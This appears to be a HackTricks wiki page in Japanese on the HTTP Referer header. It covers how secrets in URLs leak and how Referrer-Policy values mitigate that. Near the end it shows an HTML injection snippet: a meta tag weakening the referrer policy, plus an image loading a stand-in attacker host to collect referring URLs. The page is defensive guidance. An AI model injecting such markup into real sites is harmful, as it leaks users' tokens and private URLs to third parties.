# Interesting HTTP Behavior

{{#include ../banners/hacktricks-training.md}}

## `Referer` Header と Referrer Policy

HTTP の `Referer` request header は、resource が request された元の absolute URL または partial URL を識別します。active な referrer policy に応じて、referring origin、path、query string を含めることができますが、URL fragment は含まれません。<sup>[[1]](#references)</sup>

### 機密情報のleak

URL の path や query parameter に含まれる secrets は、browser history、logs、analytics、copy された links、`Referer` header を通じてleakする可能性があります。そのため、cross-origin link または subresource request によって、referring URL が外部 server に開示される可能性があります。<sup>[[2]](#references)</sup>

### Mitigation

`Referrer-Policy` response header を使用して、browser が送信する referrer information の量を制御します。`strict-origin-when-cross-origin` は browser における modern default であり、`no-referrer` は header を完全に抑制します。application の要件に適合する policy を選択してください。<sup>[[3]](#references)</sup>
```http
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
パスワード、session identifier、API key、その他の機密値をURLに含めないでください。代わりに、TLS経由で適切なrequest headerまたはrequest bodyに含めて送信してください。<sup>[[2]](#references)</sup>

### HTML Injectionに関する考慮事項

`<meta name="referrer">`を使用して、document全体に適用されるpolicyを設定することもできます。HTML injectionの脆弱性によって攻撃者が有効なmeta elementを挿入できる場合、攻撃者は後続のrequestに対するdocumentのpolicyを弱めようとする可能性があります。動的にinjectionされたmeta policyや競合するmeta policyは予測不能な動作をすることがあるため、response headerが常に上書きされると想定せず、対象のbrowserで動作を検証してください。<sup>[[4]](#references)</sup>
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.example/collect" alt="">
```
基礎となる HTML injection を修正し、機密データを URL に含めないでください。referrer policy は多層防御の一環であり、いずれの対策の代替にもなりません。

## References

- [1] [MDN - `Referer` ヘッダー](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer)
- [2] [MITRE CWE-598 - 機密性の高いクエリ文字列での GET Request Method の使用](https://cwe.mitre.org/data/definitions/598.html)
- [3] [MDN - `Referrer-Policy` ヘッダー](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy)
- [4] [MDN - `<meta name="referrer">`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/meta/name/referrer)
{{#include ../banners/hacktricks-training.md}}
